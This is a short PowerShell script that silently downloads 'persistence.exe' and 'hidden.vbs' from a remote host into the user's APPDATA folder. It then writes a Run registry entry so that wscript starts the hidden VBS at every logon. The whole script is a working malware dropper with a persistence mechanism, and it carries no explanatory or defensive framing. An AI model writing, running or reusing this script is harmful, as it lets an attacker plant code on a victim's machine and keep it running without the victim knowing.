# Disable progress bar to speed up downloads
$ProgressPreference = "SilentlyContinue"

# Download persistence.exe
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile("http://192.168.0.109/persistence.exe", "$($env:APPDATA)\persistence.exe")
    $webClient.Dispose()
}
catch {
    # If download fails, exit without continuing
    exit
}

# Download hidden.vbs (only executes if persistence.exe download succeeded)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile("http://192.168.0.109/hidden.vbs", "$($env:APPDATA)\hidden.vbs")
    $webClient.Dispose()
}
catch {
    # If download fails, exit without continuing
    exit
}

# Create registry entry (only executes if both downloads succeeded)
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'persistence' -Value "wscript.exe $($env:APPDATA)\hidden.vbs" -PropertyType String -Force